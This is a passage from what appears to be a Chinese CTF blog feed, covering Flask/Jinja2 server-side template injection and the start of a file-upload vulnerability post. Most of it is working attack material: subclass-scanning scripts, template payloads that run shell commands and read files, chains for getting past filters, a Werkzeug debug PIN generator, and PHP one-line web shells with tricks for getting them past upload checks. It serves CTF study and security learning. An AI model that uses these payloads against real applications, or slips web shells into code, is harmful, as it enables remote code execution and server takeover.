response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>

<h3 id="脚本找危险函数"><a href="#脚本找危险函数" class="headerlink" title="脚本找危险函数"></a>脚本找危险函数</h3><p>也可以使用脚本来寻找哪个类中有<code>__builtins__</code>内置模块,然后寻找其中是否有危险函数<br><strong>POST传参:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;eval&#x27;</span>  <span class="comment">#需要查询的函数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;<span class="string">&quot;search&quot;</span>:<span class="string">&quot;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span>&#125;</span><br><span class="line">    response=requests.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>GET传参:</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;eval&#x27;</span>  <span class="comment">#需要查询的函数</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    payload=<span class="string">&quot;?search=&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;][&#x27;__builtins__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">    newurl=url+payload</span><br><span class="line">    response=requests.get(url=newurl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>

<h3 id="OS模块执行命令"><a href="#OS模块执行命令" class="headerlink" title="OS模块执行命令"></a>OS模块执行命令</h3><ol>
<li><p><strong>在其他函数中直接调用os模块</strong></p>
<ol>
<li><code>&#123;&#123;self.__dict__._TemplateReference__context.keys()&#125;&#125;</code>显示当前flask有哪些函数和对象</li>
<li>通过<code>config</code>,调用os<br><strong>payload</strong><code>&#123;&#123;config.__class__.__init__.__globals__['os'].popen('ls').read()&#125;&#125;</code></li>
<li>通过<code>url_for</code>,调用os<br><strong>payload</strong><code>&#123;&#123;url_for.__globals__.os.popen('ls').read()&#125;&#125;</code></li>
</ol>
</li>
<li><p><strong>在已经加载os模块的子类里调用os模块</strong><br>脚本查询哪些类中已经加载了os模块,输出编号</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;网址&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;os.py&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    payload=<span class="string">&quot;?search=&#123;&#123;().__class__.__base__.__subclasses__()[&quot;</span>+<span class="built_in">str</span>(i)+<span class="string">&quot;].__init__[&#x27;__glo&#x27;+&#x27;bals__&#x27;]&#125;&#125;&quot;</span></span><br><span class="line">    newurl=url+payload</span><br><span class="line">    response=requests.get(url=newurl)</span><br><span class="line">    <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">if</span> flag <span class="keyword">in</span> response.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;+&#x27;</span>+<span class="built_in">str</span>(i))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;----&#x27;</span>+<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure>
<p>在已经加载os模块的子类里调用os模块<br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="一些技巧"><a href="#一些技巧" class="headerlink" title="一些技巧"></a>一些技巧</h2><h3 id="war类执行命令"><a href="#war类执行命令" class="headerlink" title="war类执行命令"></a>war类执行命令</h3><p>直接上<strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">for</span>(x)<span class="keyword">in</span>().__class__.__base__.__subclasses__()%&#125;&#123;%<span class="keyword">if</span><span class="string">&#x27;war&#x27;</span><span class="keyword">in</span>(x).__name__ %&#125;&#123;&#123;x()._module.__builtins__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;cat flag.txt&#x27;</span>).read()&#125;&#125;&#123;%endif%&#125;&#123;%endfor%&#125;</span><br></pre></td></tr></table></figure>
<p>在所有子类中查找名称中包含“war”的类，然后使用该类的<code>_module</code>属性来访问<code>__builtins__</code>并导入os模块。然后，它使用os.popen函数运行命令cat flag.txt并读取输出。</p>
<h3 id="importlib类执行命令"><a href="#importlib类执行命令" class="headerlink" title="importlib类执行命令"></a>importlib类执行命令</h3><p>先用脚本查找危险类,如果可以找到<code>_frozen_importlib.Builtinlmporter</code>,就可以使用这个类的特性<br>这个类可以加载第三方库,使用<code>load_module</code>加载os模块<br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="linecache执行命令"><a href="#linecache执行命令" class="headerlink" title="linecache执行命令"></a>linecache执行命令</h3><p><code>linecache</code>函数可以用于读取任意文件的某一行,由于这个函数中也引入了os模块,使用我们也可以利用这个函数调用os模块从而实现命令执行<br>先用脚本找到危险函数,然后直接引用其中的os即可<br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号].__init__.__globals__.linecache.os.popen(<span class="string">&quot;ls&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
<h3 id="subprocess-Popen类执行命令"><a href="#subprocess-Popen类执行命令" class="headerlink" title="subprocess.Popen类执行命令"></a>subprocess.Popen类执行命令</h3><p><code>subprocess.Popen</code>是Python中的一个类，它可以用来产生子进程，并连接到子进程的标准输入&#x2F;输出&#x2F;错误中去，还可以得到子进程的返回值。这个类是从Python2.4版本开始引入的，旨在替代其他几个老的模块或函数，比如：<code>os.system</code>, <code>os.spawn*</code>, <code>os.popen*</code>, <code>popen2.*</code>, <code>commands.*</code><br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[编号](<span class="string">&#x27;ls&#x27;</span>,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>].strip()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="双花括号过滤绕过"><a href="#双花括号过滤绕过" class="headerlink" title="双花括号过滤绕过"></a>双花括号过滤绕过</h3><ol>
<li><strong>基本思路</strong><br>用<code>&#123;% %&#125;</code>代替<code>&#123;&#123; &#125;&#125;</code><br><code>&#123;%%&#125;</code>是flask框架下的控制语句,可以在语句中实现<code>set</code>,<code>if</code>,<code>for</code>等语句,并且是以<code>&#123;% end。。。 %&#125;</code>的形式结尾</li>
<li><strong>寻找编号</strong><br>先上<strong>payload</strong><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>().__class__.__base__.__subclasses__()[<span class="string">&quot;+str(i)+&quot;</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()%&#125;OK&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>
将这段代码放在脚本里,如果输出OK就代表成功找到,这个和之前方法没有本质上的区别,之前能用的payload改成这样<code>&#123;%%&#125;</code>的形式还是可以实现,但是还要想办法输出</li>
<li><strong>怎么输出</strong><br>其实要输出也很简单,在控制语句中<code>print</code>,就可以成功输出了<br>例如<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="keyword">if</span>().__class__.__base__.__subclasses__()[编号].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>).read()%&#125;</span><br></pre></td></tr></table></figure>
或者之前的payload加print<br><code>&#123;%print(url_for.__globals__.os.popen('ls').read())%&#125;</code></li>
</ol>
<h3 id="无回显盲注"><a href="#无回显盲注" class="headerlink" title="无回显盲注"></a>无回显盲注</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><h4 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h4><h4 id="脚本盲注"><a href="#脚本盲注" class="headerlink" title="脚本盲注"></a>脚本盲注</h4><h3 id="中括号过滤绕过"><a href="#中括号过滤绕过" class="headerlink" title="中括号过滤绕过"></a>中括号过滤绕过</h3><ol>
<li><strong>__getitem()__代替[]</strong><br><code>__getitem__()</code>是python的一个魔术方法<br>对字典使用时,括号内代表的是字典的键,返回对应的键值<br>对列表使用时,括号内代表的是列表的索引,返回索引对应的值<br><code>__subclasses__()[编号]</code>等价与<code>__subclasses__().__getitem__(编号)</code></li>
</ol>
<h3 id="单双引号的过滤绕过"><a href="#单双引号的过滤绕过" class="headerlink" title="单双引号的过滤绕过"></a>单双引号的过滤绕过</h3><ol>
<li><strong>request模块绕过</strong><br>flask框架下内置了request模块.可以用于获取get和post提交的数据,但是和直接在python中使用request略有不同<br><strong>get传参</strong><code>request.args.name</code>这边的name为参数名<br><strong>post传参</strong><code>request.form.name</code>这边的name为参数名<br><strong>cookie传参</strong><code>request.cookies.name</code>这边的name为参数名</li>
<li><strong>替换关键字</strong><br>在原本需要引号包裹,或是关键词被过滤时,可以将request放在原本的位置,然后再传入参数<br>例如(执行命令<code>ls</code>)<br><code>?name=&#123;%print(url_for.__globals__.os.popen(request.args.cmd).read())%&#125;&amp;cmd=ls</code><br>一般题目是get传参我们也使用get传参,题目是post传参我们也使用post传参,因为如果后端没开启的传参模式会报错<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230518210329.png" alt="cookie传参"></li>
</ol>
<h3 id="下划线的过滤绕过"><a href="#下划线的过滤绕过" class="headerlink" title="下划线的过滤绕过"></a>下划线的过滤绕过</h3><ol>
<li><p><strong>过滤器</strong><br>过滤器用过管道符(<code>|</code>)与变量连接,还可以有可选的参数,效果类似于将这个变量输入函数中,然后获取输出结果,过滤器的本质也就是函数,多个过滤器可以通过管道符连接使用(将一个过滤器的输出作为下一个过滤器的输入)<br>下面是flask中常见的过滤器<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230518210908.png"></p>
</li>
<li><p><strong>过滤器+request模块</strong><br>可以用attr()过滤器+request模块实现对下划线的绕过<br>例如<br><code>&#123;&#123;().__class__.__base__&#125;&#125;</code>等价于<code>&#123;&#123;()|attr('__class__')|attr('__base__')&#125;&#125;</code><br>配合<code>request</code>可以<br><code>?name=&#123;&#123;()|attr(request.args.cla)|attr(request.args.ba)&#125;&#125;&amp;cla=__class__&amp;ba=__base__</code></p>
</li>
<li><p><strong>编码绕过</strong><br><code>16进制编码</code>,用<code>\x5f</code>来代替下划线<code>_</code>,用<code>\x2e</code>代替小数点<code>.</code><br>例如<strong>paylaod</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;config[<span class="string">&quot;\x5f\x5fclass\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5finit\x5f\x5f&quot;</span>][<span class="string">&quot;\x5f\x5fglobals\x5f\x5f&quot;</span>][<span class="string">&quot;os&quot;</span>][<span class="string">&quot;popen&quot;</span>](<span class="string">&quot;cat app\x2epy&quot;</span>)[<span class="string">&quot;read&quot;</span>]()&#125;&#125;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>格式化字符串</strong><br><strong>payload</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;()|attr(<span class="string">&quot;%c%cclass%c%c&quot;</span>%(<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>,<span class="number">95</span>))&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>类似于这样的形式,不仅是下划线,关键字也可以采用这样的方式绕过</p>
</li>
<li><p><strong>取字符绕过</strong><br><code>&#123;%set xhx=(lipsum|string|list)[18]%&#125;</code>类似于这样的形式,在一个字符串中找到需要的那个字符,然后根据索引取到字符</p>
</li>
</ol>
<h3 id="点绕过"><a href="#点绕过" class="headerlink" title="点绕过"></a>点绕过</h3><ol>
<li><p>使用中括号<code>[]</code>绕过点<code>.</code><br>魔术方法和魔术方法之间的连接既可以用<code>.</code>,也可以用中括号,但是使用中括号必须用引号包裹字符串<br><code>&#123;&#123;().__class__.__base__&#125;&#125;</code>等价于<code>&#123;&#123;()["__class__"]["__base__"]&#125;&#125;</code></p>
</li>
<li><p>使用<code>attr</code>过滤器<br>和前面下划线绕过差不多,不再演示了</p>
</li>
</ol>
<h3 id="关键字绕过"><a href="#关键字绕过" class="headerlink" title="关键字绕过"></a>关键字绕过</h3><ol>
<li><p><strong>+拼接绕过</strong><br>最简单方法就是使用拼接<code>[&#39;glo&#39;+&#39;bals&#39;]</code>等价于<code>[&#39;globals&#39;]</code></p>
</li>
<li><p><strong>过滤器绕过</strong><br>前面介绍过的<code>reverse</code>反转过滤器<br>例如<code>&#123;%set a='__ssalc__'|reverse%&#125;&#123;&#123;a&#125;&#125;</code>,就是将<code>__ssalc__</code>逆序变成<code>__class__</code></p>
</li>
<li><p><strong>~拼接绕过</strong><br><strong>payload</strong><code>&#123;%set a="__cla"%&#125;&#123;%set b="ss__"%&#125;&#123;&#123;a~b&#125;&#125;</code></p>
</li>
<li><p><strong>其他</strong><br>类似于之前的编码绕过,格式化字符串,取字符绕过等方法也都是可以实现的,比较复杂,就不演示了</p>
</li>
</ol>
<h3 id="数字过滤"><a href="#数字过滤" class="headerlink" title="数字过滤"></a>数字过滤</h3><ol>
<li>Length过滤器绕过<br><strong>payload</strong><code>&#123;%set m='aaaaaaaaa'|length%&#125;&#123;&#123;m&#125;&#125;</code>这里的m为a的个数统计,为<code>9</code><br>可以配合加减乘除<br><code>&#123;%set m='aaaaaaaaaa'|length*'aa'|length%&#125;&#123;&#123;m&#125;&#125;</code>这边m等于9*2,为<code>18</code></li>
</ol>
<h3 id="config获取配置信息"><a href="#config获取配置信息" class="headerlink" title="config获取配置信息"></a>config获取配置信息</h3><p>flag有可能隐藏在<code>config</code>,无过滤的情况下可以直接<code>&#123;&#123;config&#125;&#125;</code>,或是<code>&#123;&#123;self.__dict__&#125;&#125;</code>查看配置信息<br>有时候有过滤,这时候可以利用内置函数或对象寻找被过滤的字符串<br>调用<code>current_app</code>相当于调用flask,绕一圈之后再使用config,效果和直接config是一样的<br><strong>payload</strong><br><code>&#123;&#123;url_for.__globals__['current_app']['con'+'fig']&#125;&#125;</code><br><code>&#123;&#123;get_flashed_messages.__globals__['current_app']['con'+'fig']&#125;&#125;</code></p>
<h3 id="过滤特殊符号"><a href="#过滤特殊符号" class="headerlink" title="过滤特殊符号"></a>过滤特殊符号</h3><p>利用flask内置函数和对象获取符号,就是前面提到的取字符绕过<br>主要思路就是使用<code>string</code>和<code>list</code>过滤器,将结果转化为字符串列表储存,然后通过索引调用需要的字符串<br><strong>payload</strong><code>&#123;&#123;(config|string|list)[编号]&#125;&#125;</code>,config换成任何一个内置函数或者对象都行</p>
<h3 id="dict和jion"><a href="#dict和jion" class="headerlink" title="dict和jion"></a>dict和jion</h3><ol>
<li><p><code>dict()</code>用来创建一个字典<br><code>&#123;%set a=dict(class=1)%&#125;&#123;&#123;a&#125;&#125;</code>  a为字典,键为<code>class</code>,值为<code>1</code></p>
</li>
<li><p><code>join</code> 将一个序列化中的参数值拼接成字符串<br><code>&#123;%set a=dict(__cla=1,ss__=1)|join%&#125;&#123;&#123;a&#125;&#125;</code>join过滤器可以将字典的键拼接,此时的<code>a=__class__</code><br>或是这样拼接<br><code>&#123;%set a=('_','_',dict(cla=a,ss=a)|join,'_','_')|join%&#125;&#123;&#123;a&#125;&#125;</code><br>这里的用到了两个join,前面的是将<code>cla</code>和<code>ss</code>拼接到一起,后面的join是将下划线和<code>class</code>拼接到一起</p>
</li>
</ol>
<h3 id="debug的pin码计算"><a href="#debug的pin码计算" class="headerlink" title="debug的pin码计算"></a>debug的pin码计算</h3><p>debug功能是开发人员在计算机程序中查找和修复错误的过程。在flask框架下可以把debug选项设置为Ture,即可开启debug,一般情况下,在功能完善后,需要把debug功能关闭,如果不把debug功能关闭,可能会带来一些安全问题</p>
<p>在程序报错后,会在浏览器中提供一个交互调试器提示输入pin码,输入正确的pin码后可以实现命令的交互,并且,pin码并不是随机生成的,而是根据一些参数计算出来的<br><img src="https://zhmblog-imgs.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E5%BA%93/20230519204426.png"></p>
<p>贴一个大佬的脚本计算pin码,其实原理就是,将原本计算pin码的过程复制下来,然后各个值自己控制</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"></span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;flaskweb&#x27;</span>  <span class="comment"># 参数一username,在ect/passwd可以看到</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># 参数二modname,默认为flask.app</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># 参数三getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)),默认为Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="comment"># 参数四getattr(mod, &#x27;__file__&#x27;, None),要获取app.py的绝对路径</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;2485377864455&#x27;</span>,  <span class="comment"># 参数五str(uuid.getnode()), 在/sys/class/net/ens33/address可以看到(需要转化十进制),一般为eth0</span></span><br><span class="line">    <span class="string">&#x27;ad4fc7650590f81ec6ab4e3a40f284a6b5a75454fcb50d6ee5347eba94a124c8&#x27;</span>  <span class="comment"># 参数六get_machine_id(), 根据操作系统不同而不同,linux的是在/etc/machine-id可以看到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.md5()  <span class="comment">#这里根据python的版本不同也不同,2.7版本用的是sha1(),将这里的md5()改成sha1</span></span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br></pre></td></tr></table></figure>
<p><strong>注意!!!!!!!!</strong><br>使用这个脚本还需要注意一些其他问题,比如我们需要有文件包含漏洞,或是能ssti出一些内容,因为我们需要去各个路径下读取参数<br>由于第六个参数比较复杂,就先不详细介绍了,参数五根据操作系统也有变化,参数四有默认值<br><code>print(int(&#39;mc地址&#39;,16))</code>参数五的转化代码,把mac地址的<code>:</code>删了<br><a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">参考1</a>,<a href="https://xz.aliyun.com/t/11036">参考2</a>,<a href="https://blog.csdn.net/weixin_44214568/article/details/124125565">参考3</a></p>
<h1 id="超级无敌payload"><a href="#超级无敌payload" class="headerlink" title="超级无敌payload"></a>超级无敌payload</h1><p>为了绕过,故意写的很抽象,偶尔偶尔用的上吧,有时候用不上也不知道什么原因,可能是payload中的某些被过滤了</p>
<p>过滤了<code>下划线_</code>,<code>空格</code>,<code>单引号&#39;&#39;和双引号&quot;&quot;</code>,<code>数字</code>,<code>某些关键字</code>,<code>中括号[]</code>,<code>小数点.</code>,<code>\</code><br>可以考虑试一下下面这个payload,基本很难cat,因为小数点被过滤了比如<code>flag.txt</code>就cat不了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> nine=<span class="built_in">dict</span>(aaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> eighteen=<span class="built_in">dict</span>(aaaaaaaaaaaaaaaaaa=a)|join|count%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pop=<span class="built_in">dict</span>(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(eighteen)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)|attr(pop)(nine)%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a,bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> ge=(xhx,xhx,<span class="built_in">dict</span>(get=a,item=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum|attr(glo)|attr(ge)(o)|attr(pope)(sys)|attr(rea)()&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>基本思路就是,在<code>lipsum</code>模块中找字符代替下划线和空格,用<code>dict(aaaaaaaaa=a)|join|count</code>来获取数字,用<code>dict+join</code>法绕过关键字<br><code>sys</code>是最后要执行的命令,可以改成<br><code>&#123;%set (sys=dict(cat=a)|join,kg,dict(fl=a,ag=a)|join)join%&#125;</code>这段代码等于cat flag<br>如果过滤的少点还可以<br><code>&#123;%set (sys=dict(cat=a)|join,kg,'/',dict(f=a)|join,'*')join%&#125;</code>这段代码等于<code>cat /f*</code>获取根目录下所有f开头的文件(用了通配符)</p>
<p>下面这个payload过滤的没上面那么多,但是有时候比上面的更好用(不知道为啥,可能上面的代码多了更容易被过滤,比如<code>attr</code>)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;%<span class="built_in">set</span> xhx=(lipsum|string|<span class="built_in">list</span>)[<span class="number">18</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> kg=(lipsum|string|<span class="built_in">list</span>)[<span class="number">9</span>]%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> glo=(xhx,xhx,<span class="built_in">dict</span>(glo=a)|join,<span class="built_in">dict</span>(bals=a)|join,xhx,xhx)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> o=<span class="built_in">dict</span>(o=a,s=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> pope=<span class="built_in">dict</span>(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> sys=<span class="built_in">dict</span>(ls=a)|join%&#125;</span><br><span class="line">&#123;%<span class="built_in">set</span> rea=<span class="built_in">dict</span>(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;&#123;lipsum[glo][o][pope](sys)[rea]()&#125;&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>SSTI</tag>
        <tag>Python</tag>
        <tag>Flask</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap工具的使用</title>
    <url>/2023/04/13/sqlmap%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Upload文件上传漏洞</title>
    <url>/2023/04/04/Upload%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>很多网站都有文件上传的功能,如果有些网站对上传的文件不做严格的限制,用户上传了一些特殊文件,后台就会将上传文件的内容当做代码执行,这样一来,用户就可以通过上传一些木马文件,获取到网站的WebShell(网页后门),用一些WebShell管理工具,实现对网站的控制<br>检测后缀:如果一个后缀能骗过检测机制,又能成功被Windows识别,那么就可以成功绕过上传<br>检测文件内容:通常需要上传一个图片马</p>
<h2 id="简单的一句话木马"><a href="#简单的一句话木马" class="headerlink" title="简单的一句话木马"></a>简单的一句话木马</h2><p><code>&lt;?php @eval($_POST[a]); ?&gt;</code>   有时候<code>&lt;?= @eval($_POST[a]); ?&gt;</code>这样也可以(没有php)</p>
<ol>
<li><code>eval()</code>函数,eval函数的作用是将括号里的字符串都当做php语句执行</li>
<li><code>@</code>是错误控制运算符,可以将产生的错误忽略</li>
<li><code>$_POST[]</code>是超全局变量,用于获取post请求的值</li>
<li><code>a</code>是可以修改的,使用中国蚁剑连接时,a为密码</li>
<li>有<code>&lt;?</code>的木马容易被识别,来个不一样的<code>GIF89a? &lt;script language=&quot;php&quot;&gt;eval($_REQUEST[1])&lt;/script&gt;</code> 密码是1</li>
</ol>
<h2 id="JavaScript-简称JS-前端验证"><a href="#JavaScript-简称JS-前端验证" class="headerlink" title="JavaScript(简称JS)前端验证"></a>JavaScript(简称JS)前端验证</h2><p>一般的前端验证的错误提示是弹窗,前端验证是指在客户端就对文件进行合法性检查,但显而易见,所有的前端验证都是不安全的,因为前端都是用户可控的</p>
<ol>
<li>F12找到检验文件的代码,删除后再上传</li>
<li>可以用一些浏览器插件来关掉JS的功能,使检测失效</li>
<li>先将文件的后缀改成允许上传的格式,再用抓包软件拦截后上传,在抓包软件中再将后缀改回原本想要上传的格式,这样就可以绕过前端直接发往后端<?php @eval($_POST[x]); ?></li>
</ol>
